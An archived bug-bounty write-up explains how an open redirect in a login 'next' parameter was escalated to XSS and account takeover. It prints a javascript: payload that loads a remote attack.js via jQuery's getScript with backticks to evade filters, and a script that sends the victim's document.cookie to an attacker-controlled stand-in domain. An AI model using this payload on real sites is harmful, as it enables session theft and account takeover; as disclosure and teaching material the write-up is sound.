---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-05-19_open-redirect-to-account-takeover.md
original_filename: 2019-05-19_open-redirect-to-account-takeover.md
title: Open-redirect to Account Takeover.
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
language: en
raw_sha256: c226a93ea421112cfa2e33232e1d9ac2af2ae5c005378c885fd359be80c02cd1
text_sha256: ea0609b63036020fc9546f87a8b8c3985540465c5847c620608e1d8e2590a168
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Open-redirect to Account Takeover.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-05-19_open-redirect-to-account-takeover.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `c226a93ea421112cfa2e33232e1d9ac2af2ae5c005378c885fd359be80c02cd1`
- Text SHA256: `ea0609b63036020fc9546f87a8b8c3985540465c5847c620608e1d8e2590a168`


## Content

---
title: "Open-redirect to Account Takeover."
url: "https://medium.com/@__rishabh__/open-redirect-to-account-takeover-e939006a9f24"
authors: ["Rishabh (@____cypher____)"]
bugs: ["Open redirect", "Account takeover"]
publication_date: "2019-05-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5255
scraped_via: "browseros"
---

# Open-redirect to Account Takeover.

1

Open-redirect to Account Takeover.
Rishabh
Follow
2 min read
·
May 20, 2019

471

3

Press enter or click to view image in full size
We will lead to here later.

Hi everyone this is my first writeup about my first bug and I want to share how I escalated open redirect to Account Takeover. Let’s go

https://victim.com/login/?next=/page/

This was the URL which redirects to the given page after login but the issue was that if I pass https://google.com to next parameter it will redirect to google.com which is external.

After reading more than 15 reports about the open redirect, I came to know what you can do with this vulnerability is redirect the user to your domain and then prompt for sensitive information for which the manipulated URL will look something like this

https://victim.com/login/?next=https://your_domain.com

Get Rishabh’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

But I did not report it that way instead I thought why not to try something else like different scheme (javascript:) and luckily there were no filters for that so now the vulnerability escalated from phishing attack to XSS after that I just made a nice POC stealing cookies of the current user who opens the manipulated URL.

Problems I faced during making POC.
Double quotes, single quote, and Parentheses were not allowed.[I used the backtick(`)]
For stealing cookies you need to make a request to your server with cookies but we can’t use fetch or XMLHttpRequest because both require Parentheses.[After one day of searching I came to know that the website uses jquery so I added my own javascript to their domain which basically allowed me to do anything] —

?next= javascript:$.getScript`https://my_own_domain/attack.js`

A
ttack.js
if(location.host == “my_own_domain”){ 
  Url = new URL(document.location); 
  Parameters = new URLSearchParams(x.search); 
  cookie = Parameters.get(“cookie”); 
  document.write(cookie);
}
else{ 
  var cookie = document.cookie; 
document.location=“https://my_own_domain/attacker.html?cookie="+cookie;
}
TakeAways
Always try the different thing I even tried for XSS (?next=<script>alert(1)</script>) sometimes it works out sometimes it does not but in both cases, you gain the experience and familiarity to the concept.
It may take you time to find your first bug but the experience is worth it.
Final Payload

https://victim.com/?next= javascript:$.getScript`https://my_own_domain/attack.js`

My twitter ==> ME

Thanks a lot for reading. Until next time
